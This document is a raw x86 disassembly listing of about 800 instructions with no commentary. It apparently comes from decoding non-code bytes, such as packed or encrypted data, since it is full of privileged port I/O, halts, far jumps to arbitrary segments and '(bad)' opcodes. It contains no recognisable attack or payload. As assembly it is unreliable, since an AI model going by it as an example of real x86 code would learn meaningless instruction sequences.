  444b6c:	pop    ecx
  444b6d:	mov    ecx,0x1e8b537d
  444b72:	in     eax,dx
  444b73:	test   BYTE PTR [ebp-0x5a],cl
  444b76:	mov    eax,DWORD PTR [ecx+0x1d]
  444b79:	and    DWORD PTR [ecx],edx
  444b7b:	dec    edi
  444b7c:	push   ds
  444b7d:	add    bl,ch
  444b7f:	dec    esp
  444b80:	mov    ecx,ss
  444b82:	mov    edx,0x249bf064
  444b87:	cmc    
  444b88:	out    dx,eax
  444b89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444b8a:	mov    ebp,DWORD PTR [edx-0x3d]
  444b8d:	inc    edi
  444b8e:	xchg   DWORD PTR [ecx+0x7812c132],eax
  444b94:	sub    eax,0x3124be1b
  444b99:	push   es
  444b9a:	mov    dl,0xe
  444b9c:	push   ebp
  444b9d:	mov    eax,ds:0xc10ea43
  444ba2:	dec    eax
  444ba3:	iret   
  444ba4:	test   eax,0xe620469c
  444ba9:	cli    
  444baa:	inc    esp
  444bab:	adc    eax,0xa209a308
  444bb0:	or     DWORD PTR [eax+0x619492fb],esp
  444bb6:	jb     0x444c10
  444bb8:	xor    al,0x7a
  444bba:	and    bh,bh
  444bbc:	std    
  444bbd:	mov    eax,0x7e1db4b3
  444bc2:	test   DWORD PTR [esi+edx*1+0x1adebe54],eax
  444bc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444bca:	ror    DWORD PTR [ebx],1
  444bcc:	cdq    
  444bcd:	sti    
  444bce:	inc    edx
  444bcf:	pop    ecx
  444bd0:	jno    0x444c20
  444bd2:	mov    bh,0x84
  444bd4:	outs   dx,DWORD PTR ds:[esi]
  444bd5:	cld    
  444bd6:	mov    ss:0xee48c435,al
  444bdc:	out    dx,eax
  444bdd:	xlat   BYTE PTR ds:[ebx]
  444bde:	pop    ebx
  444bdf:	mov    bl,0xe2
  444be1:	fisubr DWORD PTR [edx+0x24]
  444be4:	adc    eax,0xff83278a
  444be9:	in     eax,0x5b
  444beb:	shl    BYTE PTR [ebp+0x79e815a5],0x9e
  444bf2:	xor    al,0xfd
  444bf4:	xor    eax,0xc8f10fa8
  444bf9:	sbb    esp,ebx
  444bfb:	xchg   BYTE PTR [ecx+ecx*2],bl
  444bfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444bff:	pop    esp
  444c00:	jae    0x444c46
  444c02:	jb     0x444ba4
  444c04:	jl     0x444ba0
  444c06:	fwait
  444c07:	inc    DWORD PTR [edx+0x67]
  444c0a:	mov    bl,BYTE PTR [ebp+0x61]
  444c0d:	in     al,dx
  444c0e:	pop    ss
  444c0f:	pusha  
  444c10:	hlt    
  444c11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444c12:	pop    ebx
  444c13:	dec    eax
  444c14:	retf   0x27a9
  444c17:	pop    esi
  444c18:	xchg   DWORD PTR [edx+0x4335e9fb],ebx
  444c1e:	xchg   ecx,eax
  444c1f:	lds    ebp,FWORD PTR [eax+0x49]
  444c22:	xor    cl,BYTE PTR [ecx-0x197e2296]
  444c28:	scas   eax,DWORD PTR es:[edi]
  444c29:	sar    BYTE PTR [esi-0x6450bed8],cl
  444c2f:	ss int3 
  444c31:	inc    esi
  444c32:	pop    es
  444c33:	inc    edi
  444c34:	std    
  444c35:	and    ebp,DWORD PTR [eax]
  444c37:	popf   
  444c38:	and    DWORD PTR [ecx],ebx
  444c3a:	stos   BYTE PTR es:[edi],al
  444c3b:	repz shl BYTE PTR [ebx-0x7],0x73
  444c40:	push   esi
  444c41:	call   0x46c8:0x7a1d813b
  444c48:	loop   0x444cb4
  444c4a:	push   ss
  444c4b:	ja     0x444bed
  444c4d:	sbb    edi,DWORD PTR [ecx+0x485fd144]
  444c53:	arpl   WORD PTR ds:0x13fa0987,dx
  444c59:	xor    eax,0x9f749334
  444c5e:	mov    ds:0xb1fa8cec,al
  444c63:	adc    al,0xf8
  444c65:	inc    ecx
  444c66:	cmp    BYTE PTR [edi-0x2e4f8b97],ch
  444c6c:	xor    dh,ah
  444c6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444c6f:	dec    ebp
  444c70:	ins    BYTE PTR es:[edi],dx
  444c71:	sbb    BYTE PTR [eax+0x396b0d24],dh
  444c77:	add    bh,BYTE PTR [ecx+edi*4]
  444c7a:	sbb    DWORD PTR [esi],0xffffffc0
  444c7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444c7e:	pop    ds
  444c7f:	fcomp  DWORD PTR [bx+0x5a2b]
  444c84:	dec    ebp
  444c85:	ins    BYTE PTR es:[edi],dx
  444c86:	or     BYTE PTR [ecx+0x32e51be8],bh
  444c8c:	lahf   
  444c8d:	mov    esi,DWORD PTR [esp+eax*2+0x281d0f81]
  444c94:	(bad)
  444c97:	hlt    
  444c98:	xchg   ecx,eax
  444c99:	push   ecx
  444c9a:	mov    ebp,0x9c592512
  444c9f:	adc    al,0xf5
  444ca1:	rol    DWORD PTR [eax+0x6c802029],0x72
  444ca8:	cmc    
  444ca9:	cmp    DWORD PTR [edi+0x25a3648e],ebp
  444caf:	dec    ebx
  444cb0:	fnstsw WORD PTR [esi+0x3921da6f]
  444cb6:	lds    ecx,FWORD PTR [ebx]
  444cb8:	cld    
  444cb9:	push   esi
  444cba:	(bad)  
  444cbb:	retf   
  444cbc:	sbb    DWORD PTR [ebp-0x13dbbbb5],0xfffffff7
  444cc3:	dec    ecx
  444cc4:	lods   al,BYTE PTR ds:[esi]
  444cc5:	sub    bh,bh
  444cc7:	add    al,0x28
  444cc9:	xchg   BYTE PTR [ebx-0x3b01cd6c],bh
  444ccf:	xor    esp,esi
  444cd1:	push   ebp
  444cd2:	push   eax
  444cd3:	fcomp  DWORD PTR [esi]
  444cd5:	adc    DWORD PTR ds:0x38b4b221,0xffffff90
  444cdc:	ret    0x7aca
  444cdf:	(bad)  
  444ce0:	sti    
  444ce1:	mov    esi,0x48d9b8c0
  444ce6:	push   esp
  444ce7:	fs push es
  444ce9:	sub    ah,BYTE PTR [edx+0x4da5935b]
  444cef:	xchg   DWORD PTR [eax],ecx
  444cf1:	jle    0x444d61
  444cf3:	mov    ch,ah
  444cf5:	leave  
  444cf6:	fs gs jne 0x444d62
  444cfa:	sbb    al,0xe8
  444cfc:	add    esp,DWORD PTR [eax-0x49da0827]
  444d02:	push   ebx
  444d03:	jmp    0xc946:0x6c41fe41
  444d0a:	call   0x99ba096
  444d0f:	xchg   edx,eax
  444d10:	inc    ebx
  444d11:	(bad)  
  444d12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444d13:	je     0x444d1a
  444d15:	pop    esi
  444d16:	and    al,dh
  444d18:	iret   
  444d19:	cs push edi
  444d1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444d1c:	and    DWORD PTR [ecx+0x56],edi
  444d1f:	fcomp  QWORD PTR [ebp-0x15]
  444d22:	jno    0x444d36
  444d24:	dec    ecx
  444d25:	dec    eax
  444d26:	jae    0x444d5d
  444d28:	adc    eax,0xb4e9026e
  444d2d:	adc    bl,BYTE PTR [esi-0x2ae30648]
  444d33:	dec    esp
  444d34:	mov    ch,0x38
  444d36:	lock repz ret 
  444d39:	(bad)  
  444d3b:	adc    al,ch
  444d3d:	repnz in al,0xe7
  444d40:	and    edx,0x80f35b97
  444d46:	in     al,dx
  444d47:	mov    al,ds:0x59b136f
  444d4c:	clc    
  444d4d:	mov    al,ds:0xdbad9f73
  444d52:	sbb    DWORD PTR [ebx],eax
  444d54:	push   ss
  444d55:	xchg   edx,eax
  444d56:	ins    BYTE PTR es:[edi],dx
  444d57:	popa   
  444d58:	push   eax
  444d59:	test   BYTE PTR [eax-0x28],bl
  444d5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444d5d:	and    ecx,ecx
  444d5f:	push   ds
  444d60:	cmp    al,0xf2
  444d62:	xchg   edx,eax
  444d63:	repnz int 0x68
  444d66:	and    eax,DWORD PTR [ebp+0x1a]
  444d69:	mov    ah,0xc9
  444d6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444d6c:	inc    ebp
  444d6d:	cdq    
  444d6e:	rol    BYTE PTR [esi+0x736b9c2e],1
  444d74:	jmp    0x5e36d46e
  444d79:	es pop edi
  444d7b:	dec    edx
  444d7c:	jae    0x444dd0
  444d7e:	mov    bl,0xa4
  444d80:	and    BYTE PTR [edx+ecx*1],bh
  444d83:	jnp    0x444d1a
  444d85:	cmp    eax,0x5e17f0c5
  444d8a:	nop
  444d8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444d8c:	pop    ds
  444d8d:	cmp    ebx,edx
  444d8f:	out    0xa7,eax
  444d91:	jne    0x444d23
  444d93:	push   0x6cba256
  444d98:	rol    BYTE PTR ds:0x4fb9440f,1
  444d9e:	pop    edx
  444d9f:	add    bh,ch
  444da1:	add    edi,DWORD PTR [esp+esi*2-0x2265686f]
  444da8:	push   ebp
  444da9:	fcmovb st,st(5)
  444dab:	icebp  
  444dac:	or     BYTE PTR [ecx+0x16],ah
  444daf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444db0:	push   ds
  444db1:	mov    ecx,0xf0c815a0
  444db6:	xor    DWORD PTR [ebp+0x5b],0xffffffde
  444dba:	ret    0xa644
  444dbd:	(bad)  
  444dbe:	loopne 0x444d54
  444dc0:	and    edi,DWORD PTR [ecx-0x7d8461da]
  444dc6:	cmp    edi,DWORD PTR [ebx-0x68]
  444dc9:	cmp    eax,0xe9557c94
  444dce:	jmp    0x444db5
  444dd0:	cli    
  444dd1:	sbb    eax,0x9b8380bb
  444dd6:	mov    bl,0xa9
  444dd8:	out    0x6a,al
  444dda:	(bad)  
  444ddb:	fidiv  WORD PTR [edx]
  444ddd:	leave  
  444dde:	sub    al,0x93
  444de0:	fdiv   st,st(3)
  444de2:	bound  edx,QWORD PTR [ebx]
  444de4:	mov    al,0xd7
  444de6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444de7:	dec    edi
  444de8:	cdq    
  444de9:	xchg   BYTE PTR [ecx+esi*8],al
  444dec:	mov    ax,gs
  444def:	(bad)  
  444df0:	and    eax,ebx
  444df2:	std    
  444df3:	pop    eax
  444df4:	dec    ebx
  444df5:	(bad)  
  444df6:	adc    al,0x31
  444df8:	pushf  
  444df9:	fisttp WORD PTR [edx+0x23269998]
  444dff:	xchg   ebp,eax
  444e00:	and    BYTE PTR [ebx],dl
  444e02:	and    eax,0x2ba2b8b6
  444e07:	lea    eax,[eax]
  444e09:	scas   eax,DWORD PTR es:[edi]
  444e0a:	(bad)  
  444e0b:	out    dx,al
  444e0c:	vfmsub213ps zmm2{k3},zmm1,zmm6,{rn-sae}
  444e12:	mov    ch,0x54
  444e14:	and    eax,0x4573b666
  444e19:	mov    dh,0x6a
  444e1b:	jmp    0x444e90
  444e1d:	popf   
  444e1e:	repz scas al,BYTE PTR es:[edi]
  444e20:	sbb    eax,0x9091989
  444e25:	and    al,0xe1
  444e27:	test   al,0xe0
  444e29:	inc    ebp
  444e2a:	stos   BYTE PTR es:[edi],al
  444e2b:	push   0xf7866f75
  444e30:	mov    edx,0xf1ae1278
  444e35:	aaa    
  444e36:	push   ebx
  444e37:	out    0x18,eax
  444e39:	mov    di,0xf854
  444e3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444e3e:	mov    bl,0x29
  444e40:	pop    eax
  444e41:	cs popa 
  444e43:	loop   0x444e94
  444e45:	sbb    DWORD PTR [edx+0x677f56b1],esi
  444e4b:	adc    eax,0x66a15f8e
  444e50:	test   al,0x6c
  444e52:	scas   al,BYTE PTR es:[edi]
  444e53:	ret    
  444e54:	push   ss
  444e55:	cdq    
  444e56:	(bad)  
  444e57:	jae    0x444ea6
  444e59:	pop    esp
  444e5a:	in     al,dx
  444e5b:	or     ah,BYTE PTR ds:0xfceb8aee
  444e61:	xor    DWORD PTR [ecx],edi
  444e63:	push   es
  444e64:	add    DWORD PTR [edx+0x2e],ebx
  444e67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444e68:	loope  0x444def
  444e6a:	mov    BYTE PTR [edx-0xe9c1079],0x6b
  444e71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444e72:	cmp    edx,DWORD PTR [eax+0x3e]
  444e75:	mov    eax,ds:0x1416b3e4
  444e7a:	mov    WORD PTR [ecx],?
  444e7c:	lahf   
  444e7d:	in     eax,dx
  444e7e:	scas   eax,DWORD PTR es:[edi]
  444e7f:	or     al,0xb5
  444e81:	rcl    DWORD PTR [eax-0x1a],cl
  444e84:	cmp    al,0x57
  444e86:	push   eax
  444e87:	jmp    0xe063:0xa633c5b9
  444e8e:	and    DWORD PTR [ebp-0x12acc188],eax
  444e94:	and    eax,0x23423f59
  444e99:	daa    
  444e9a:	dec    edi
  444e9b:	xor    dh,ch
  444e9d:	stos   BYTE PTR es:[edi],al
  444e9e:	mov    esi,DWORD PTR [edx+0x244bfbcf]
  444ea4:	out    dx,eax
  444ea5:	fimul  WORD PTR [edx-0x4516e1c2]
  444eab:	jl     0x444e5b
  444ead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444eae:	sbb    eax,0x39c66748
  444eb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444eb4:	jne    0x444eac
  444eb6:	mov    ecx,0xdf3cd4fd
  444ebb:	sub    eax,0x25f204f2
  444ec0:	mov    ?,WORD PTR cs:[eax+0x27ba2364]
  444ec7:	sbb    ebp,esp
  444ec9:	ret    
  444eca:	dec    edx
  444ecb:	repnz dec ebp
  444ecd:	fs dec eax
  444ecf:	data16 adc ch,bl
  444ed2:	ret    
  444ed3:	xchg   ecx,eax
  444ed4:	and    al,0x81
  444ed6:	leave  
  444ed7:	mov    ds,WORD PTR [ebx]
  444ed9:	pop    edi
  444eda:	pop    esp
  444edb:	mov    edx,0x28721546
  444ee0:	out    0xcc,eax
  444ee2:	mov    bl,0x73
  444ee4:	mov    eax,ds:0x1a6282e4
  444ee9:	dec    ecx
  444eea:	inc    edi
  444eeb:	jmp    0x9b9e:0x29a73a33
  444ef2:	jnp    0x444eab
  444ef4:	add    al,0x4f
  444ef6:	or     eax,0xedc1d845
  444efb:	sahf   
  444efc:	es popf 
  444efe:	mov    ah,0x54
  444f00:	mov    esi,0x75169609
  444f05:	mov    ebp,0x706de5d5
  444f0a:	xchg   DWORD PTR [ebx*1-0x31f5ed87],ebp
  444f11:	out    dx,al
  444f12:	add    ch,cl
  444f14:	(bad)  
  444f15:	popf   
  444f16:	pop    ebx
  444f17:	pop    ds
  444f18:	dec    eax
  444f19:	loopne 0x444ebf
  444f1b:	lods   al,BYTE PTR ds:[esi]
  444f1c:	inc    esp
  444f1d:	jno    0x444ee5
  444f1f:	rcl    DWORD PTR [ebx],cl
  444f21:	mov    ah,BYTE PTR [edi]
  444f23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444f24:	push   es
  444f25:	daa    
  444f26:	mov    ebp,0x95abd034
  444f2b:	fldenv [eax+ecx*4+0x72]
  444f2f:	push   esp
  444f30:	xchg   esi,eax
  444f31:	aam    0xe5
  444f33:	loop   0x444f50
  444f35:	addr16 cs ret 0xceb3
  444f3a:	inc    edi
  444f3b:	ror    DWORD PTR [esi+0x20352cd1],1
  444f41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444f42:	test   al,0xf1
  444f44:	adc    eax,0xfb1efba8
  444f49:	test   bl,al
  444f4b:	shl    BYTE PTR [ebp+0x38d6897c],1
  444f51:	mov    cl,0x1c
  444f53:	out    0xb1,eax
  444f55:	xchg   edx,eax
  444f56:	mov    al,0xb4
  444f58:	mov    ecx,0x865d1c83
  444f5d:	jmp    0x444ee5
  444f5f:	add    al,0x52
  444f61:	mov    ebp,0xa91834bd
  444f66:	cli    
  444f67:	cmp    BYTE PTR [eax],bl
  444f69:	dec    esp
  444f6a:	aaa    
  444f6b:	add    al,ah
  444f6d:	test   al,0xbb
  444f6f:	jmp    0x6e65:0x8047e3f6
  444f76:	aad    0xf9
  444f78:	(bad)  
  444f79:	retf   
  444f7a:	mov    ds:0xf9a68105,al
  444f7f:	repz retf 0x2bd7
  444f83:	ss push ecx
  444f85:	xchg   ecx,eax
  444f86:	pop    ecx
  444f87:	sub    dl,BYTE PTR [esi]
  444f89:	xor    DWORD PTR [edx],0x69
  444f8c:	and    ecx,ecx
  444f8e:	aad    0x6e
  444f90:	fsub   DWORD PTR [ebx-0x57f6bbd2]
  444f96:	in     al,0x60
  444f98:	xor    eax,0x8ff09da7
  444f9d:	inc    esp
  444f9e:	sub    edi,0xfffffff6
  444fa1:	(bad)  
  444fa2:	repz fsub QWORD PTR [ebx]
  444fa5:	xor    DWORD PTR [edi-0x36],ebx
  444fa8:	sbb    al,0xa7
  444faa:	stos   DWORD PTR es:[edi],eax
  444fab:	lock hlt 
  444fad:	jmp    0x9423b436
  444fb2:	push   ds
  444fb3:	ror    DWORD PTR [ecx-0x4c],0x5b
  444fb7:	sub    BYTE PTR [eax-0x5efabf9c],cl
  444fbd:	sub    BYTE PTR [eax-0x1c5cf89b],bl
  444fc3:	lods   eax,DWORD PTR ds:[esi]
  444fc4:	xchg   ebp,eax
  444fc5:	push   ebx
  444fc6:	mov    al,ds:0x5bc5e8f1
  444fcb:	rcr    BYTE PTR [eax+0x49f4c8a1],1
  444fd1:	(bad)  
  444fd2:	cmc    
  444fd3:	test   eax,0x8cbfe237
  444fd8:	mov    gs,WORD PTR [esi+edi*4]
  444fdb:	pop    ebx
  444fdc:	iret   
  444fdd:	cmp    ch,BYTE PTR [edx+0x15]
  444fe0:	sub    ecx,ecx
  444fe2:	dec    edi
  444fe3:	fs loope 0x44500b
  444fe6:	dec    ebx
  444fe7:	mov    al,ds:0xe94ec923
  444fec:	mov    dl,0x1f
  444fee:	add    DWORD PTR [eax+0x5a],0xffffffa6
  444ff2:	fwait
  444ff3:	cmp    bl,BYTE PTR [esi+ecx*2-0x297290c8]
  444ffa:	jns    0x445035
  444ffc:	sub    al,0xe9
  444ffe:	mov    ecx,0x1178984
  445003:	js     0x445069
  445005:	call   0x44dc:0xe7f282b
  44500c:	mov    bl,0x6a
  44500e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44500f:	int3   
  445010:	scas   al,BYTE PTR es:[edi]
  445011:	sti    
  445012:	sub    DWORD PTR [ebp+0x648e828f],esp
  445018:	sbb    DWORD PTR [eax-0x6d2f1061],ecx
  44501e:	pop    esp
  44501f:	fisubr WORD PTR [ebp-0x36]
  445022:	push   es
  445023:	mov    edi,0x8cb14d94
  445028:	das    
  445029:	jmp    0x32663578
  44502e:	(bad)  
  44502f:	mov    ecx,0xc2d756
  445034:	in     eax,0x80
  445036:	pop    ss
  445037:	jmp    0x444ff7
  445039:	fwait
  44503a:	or     BYTE PTR ds:0x5b2d8ada,0x16
  445041:	in     eax,dx
  445042:	in     al,dx
  445043:	pop    ecx
  445044:	test   BYTE PTR [eax+0x2d],ch
  445047:	int3   
  445048:	popaw  
  44504a:	jecxz  0x4450a9
  44504c:	push   esp
  44504d:	cdq    
  44504e:	mov    al,0x8d
  445050:	sub    dl,BYTE PTR [edi-0x7e]
  445053:	jecxz  0x445032
  445055:	inc    esi
  445056:	aam    0xf4
  445058:	jp     0x445000
  44505a:	cmp    DWORD PTR ds:0xeecb9a40,edi
  445060:	mov    BYTE PTR [eax+ebp*2-0x7b],al
  445064:	dec    eax
  445065:	push   ebx
  445066:	dec    edi
  445067:	add    al,BYTE PTR [ebx]
  445069:	sub    esi,DWORD PTR [ecx-0x3618eb7c]
  44506f:	mov    ch,0xf8
  445071:	lea    ecx,[eax-0x35]
  445074:	stc    
  445075:	popa   
  445076:	jb     0x4450f7
  445078:	and    esi,DWORD PTR [edi+0x3b]
  44507b:	xor    BYTE PTR [ebx-0x6d],al
  44507e:	mov    bh,0x19
  445080:	xor    al,0x49
  445082:	or     esp,DWORD PTR ds:0x4a580523
  445088:	mov    bl,cl
  44508a:	stc    
  44508b:	mov    bh,ch
  44508d:	fwait
  44508e:	pop    ebx
  44508f:	add    ebp,ebp
  445091:	jne    0x445099
  445093:	dec    eax
  445094:	inc    ebx
  445095:	imul   esi,DWORD PTR [esp+ebp*8-0x76],0x2c24caf2
  44509d:	test   eax,0x9bac3a19
  4450a2:	sti    
  4450a3:	xchg   edx,eax
  4450a4:	or     DWORD PTR [edi],esi
  4450a6:	aas    
  4450a7:	mov    edx,0x111202aa
  4450ac:	mov    BYTE PTR es:[ecx+ebx*2],bh
  4450b0:	je     0x44504c
  4450b2:	mov    ebx,0x10652c5c
  4450b7:	repnz outs dx,BYTE PTR gs:[esi]
  4450ba:	cmp    ch,bl
  4450bc:	clc    
  4450bd:	dec    edi
  4450be:	mov    ds:0x603922af,al
  4450c3:	test   DWORD PTR [edx-0x5acd724e],eax
  4450c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4450ca:	retf   
  4450cb:	(bad)  
  4450cc:	push   ecx
  4450cd:	mov    eax,0x8dafad0
  4450d2:	dec    ecx
  4450d3:	push   ss
  4450d4:	int    0x73
  4450d6:	mov    edi,0x624daac4
  4450db:	(bad)
  4450de:	mov    ebx,0xb0ca77ba
  4450e3:	fs push edx
  4450e5:	iret   
  4450e6:	inc    esp
  4450e7:	aas    
  4450e8:	in     eax,dx
  4450e9:	je     0x4450a5
  4450eb:	push   esp
  4450ec:	fs leave 
  4450ee:	cmp    bh,bh
  4450f0:	ss jns 0x445118
  4450f3:	xchg   esi,eax
  4450f4:	pop    ds
  4450f5:	sar    DWORD PTR [ecx+0x34],0x42
  4450f9:	(bad)  
  4450fb:	mov    dl,0xe9
  4450fd:	ret    0xd4b3
  445100:	sub    ebx,DWORD PTR [eax-0x60]
  445103:	in     eax,0x65
  445105:	call   0xc44f:0x1b23a8db
  44510c:	es aad 0x5d
  44510f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445110:	arpl   bx,dx
  445112:	ret    0x4404
  445115:	xchg   ebp,eax
  445116:	pop    ecx
  445117:	arpl   WORD PTR [esi],ax
  445119:	popf   
  44511a:	cmp    edx,esp
  44511c:	out    dx,al
  44511d:	sbb    bl,BYTE PTR [edi+0x5e]
  445120:	add    al,0xe8
  445122:	mov    ds:0xbec1eae0,al
  445127:	adc    al,0xd9
  445129:	jnp    0x44510b
  44512b:	and    al,BYTE PTR [ebp+0x15]
  44512e:	retf   
  44512f:	call   0xa2bef8d8
  445134:	pop    ds
  445135:	cmp    esp,edx
  445137:	es retf 
  445139:	aas    
  44513a:	sub    al,0x4a
  44513c:	arpl   WORD PTR [edi],dx
  44513e:	in     al,dx
  44513f:	aaa    
  445140:	aaa    
  445141:	mov    bh,0x55
  445143:	es mov esp,0x33f2ed6b
  445149:	sbb    esi,esi
  44514b:	ror    DWORD PTR [ecx+0x23f6be70],1
  445151:	std    
  445152:	test   al,0xeb
  445154:	push   0xd2ee6ba1
  445159:	data16 jg 0x44513a
  44515c:	imul   esi,DWORD PTR [esi],0x7
  44515f:	inc    ebx
  445160:	cmp    bh,BYTE PTR [ecx-0x46]
  445163:	xchg   esp,eax
  445164:	push   esi
  445165:	jge    0x445158
  445167:	lods   al,BYTE PTR ds:[esi]
  445168:	test   eax,0x1f83e228
  44516d:	fwait
  44516e:	mov    ch,0x5c
  445170:	mov    dh,0xb7
  445172:	test   DWORD PTR [ecx+0x3b],ebx
  445175:	add    DWORD PTR [edi+0x21ad34e7],ebx
  44517b:	push   ebp
  44517c:	mov    ds:0x25acbc83,al
  445181:	es add dh,cl
  445184:	jmp    0x445159
  445186:	xor    bh,BYTE PTR [ebx+eiz*1-0x7]
  44518a:	rcr    al,1
  44518c:	mov    edi,0xf99af76b
  445191:	call   0x4cf:0x5d5d34db
  445198:	pop    esi
  445199:	or     al,0x2
  44519b:	ins    DWORD PTR es:[edi],dx
  44519c:	lea    ecx,[ecx-0x1e6b43]
  4451a2:	jne    0x445188
  4451a4:	dec    di
  4451a6:	inc    ebp
  4451a7:	pop    ss
  4451a8:	dec    esp
  4451a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4451aa:	mov    ch,BYTE PTR [edi+eiz*2]
  4451ad:	and    bh,BYTE PTR [eax+eax*2]
  4451b0:	and    al,0xb9
  4451b2:	cmp    bl,dh
  4451b4:	jmp    0x4451b0
  4451b6:	imul   esp,DWORD PTR [edx+edx*1+0x77e77b27],0xffffffbc
  4451be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4451bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4451c0:	pop    dx
  4451c2:	(bad)  
  4451c4:	push   ebp
  4451c5:	push   esp
  4451c6:	lds    edi,FWORD PTR [eax]
  4451c8:	adc    DWORD PTR [ebp-0x81a0ebe],edi
  4451ce:	pop    ebx
  4451cf:	sub    al,0x75
  4451d1:	dec    esp
  4451d2:	add    DWORD PTR [ebp-0x68513eea],edx
  4451d8:	jne    0x445189
  4451da:	sbb    edx,DWORD PTR [ecx+0x4d]
  4451dd:	push   cs
  4451de:	mov    gs,WORD PTR [eax-0x42]
  4451e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4451e2:	sbb    BYTE PTR [esi+eiz*8],bh
  4451e5:	cmp    al,ah
  4451e7:	xor    BYTE PTR ds:0xe4994c99,ah
  4451ed:	and    DWORD PTR [edx],esp
  4451ef:	pop    edx
  4451f0:	cdq    
  4451f1:	fsubr  QWORD PTR [edx-0x39]
  4451f4:	leave  
  4451f5:	xchg   BYTE PTR [esp+eax*4-0x79c4c96f],dh
  4451fc:	ins    DWORD PTR es:[edi],dx
  4451fd:	cmp    dh,BYTE PTR [edx-0x1d3c482c]
  445203:	loopne 0x44525b
  445205:	es mov bh,0x63
  445208:	push   0xffffffa0
  44520a:	cwde   
  44520b:	mov    BYTE PTR [ebx+0x4ad26c4b],dh
  445211:	xor    eax,0xd21752a
  445216:	les    esp,FWORD PTR [ecx-0x7e]
  445219:	cdq    
  44521a:	stos   DWORD PTR es:[edi],eax
  44521b:	jnp    0x4451c2
  44521d:	ret    
  44521e:	lea    esi,[ecx-0x725978c7]
  445224:	cmp    eax,0xe144bab4
  445229:	pop    esi
  44522a:	dec    edx
  44522b:	iret   
  44522c:	jne    0x445299
  44522e:	inc    edi
  44522f:	jmp    0x48404108
  445234:	jmp    0xf875:0x8ea0570a
  44523b:	inc    ebp
  44523c:	push   ds
  44523d:	pop    ss
  44523e:	dec    esp
  44523f:	scas   al,BYTE PTR es:[edi]
  445240:	push   ebx
  445241:	pushf  
  445242:	cmp    ebp,DWORD PTR [edx]
  445244:	outs   dx,BYTE PTR ds:[esi]
  445245:	xor    dl,BYTE PTR [esi]
  445247:	adc    ecx,DWORD PTR [ecx]
  445249:	push   ecx
  44524a:	adc    ecx,DWORD PTR [edx+0x57]
  44524d:	jmp    0x6405f704
  445252:	dec    edx
  445253:	push   ebp
  445254:	aad    0xcb
  445256:	jo     0x445245
  445258:	dec    edx
  445259:	popf   
  44525a:	add    DWORD PTR [eax],0xddd16ae6
  445260:	and    esi,ebp
  445262:	mov    al,BYTE PTR [ebp+0x556044b9]
  445268:	mov    BYTE PTR [edx+0x13],0x64
  44526c:	call   FWORD PTR [ecx-0x43c1c44]
  445272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445273:	mov    dl,0xf6
  445275:	sub    al,0xf8
  445277:	ret    
  445278:	jne    0x44524d
  44527a:	shl    ebp,0x9a
  44527d:	xchg   ebp,eax
  44527e:	sub    BYTE PTR [esi],dl
  445280:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445281:	lock aaa 
  445283:	(bad)  
  445284:	shr    eax,1
  445286:	xchg   esp,eax
  445287:	jmp    0x946fffe3
  44528c:	cmpneqps xmm4,xmm2
  445290:	cwde   
  445291:	pop    ds
  445292:	and    al,0xc1
  445294:	fld    TBYTE PTR [eax+0xd]
  445297:	shl    BYTE PTR [esi],cl
  445299:	sahf   
  44529a:	jnp    0x445302
  44529c:	mov    esp,0x18236055
  4452a1:	dec    ecx
  4452a2:	test   al,0x4
  4452a4:	fisttp QWORD PTR ds:0x62b277e6
  4452aa:	push   ecx
  4452ab:	fdivr  DWORD PTR [esi-0x60]
  4452ae:	mov    edi,DWORD PTR [edx-0x47621780]
  4452b4:	outs   dx,BYTE PTR ds:[esi]
  4452b5:	mov    ds:0x595598fd,al
  4452ba:	js     0x44531f
  4452bc:	jae    0x4452d5
  4452be:	addr16 out dx,eax
  4452c0:	fist   WORD PTR [ebx]
  4452c2:	je     0x4452b7
  4452c4:	cmc    
  4452c5:	jae    0x4452a3
  4452c7:	in     eax,0xad
  4452c9:	jmp    0x9890:0x9918bcdb
  4452d0:	js     0x4452dc
  4452d2:	mov    BYTE PTR [edi],ch
  4452d4:	push   esi
  4452d5:	sahf   
  4452d6:	jnp    0x445328
  4452d8:	inc    ebp
  4452d9:	icebp  
  4452da:	push   edi
  4452db:	xchg   edi,eax
  4452dc:	push   esi
  4452dd:	lahf   
  4452de:	jmp    0xb1c7f0f0
  4452e3:	les    ecx,FWORD PTR [esi-0x2c]
  4452e6:	adc    bl,BYTE PTR [esi]
  4452e8:	std    
  4452e9:	cmp    eax,0x67f503c3
  4452ee:	shl    bl,1
  4452f0:	scas   al,BYTE PTR es:[edi]
  4452f1:	or     DWORD PTR [ebx+0x1657a32b],esp
  4452f7:	pop    edi
  4452f8:	jne    0x44534d
  4452fa:	mov    ah,0xc4
  4452fc:	and    bh,ch
  4452fe:	dec    ecx
  4452ff:	cli    
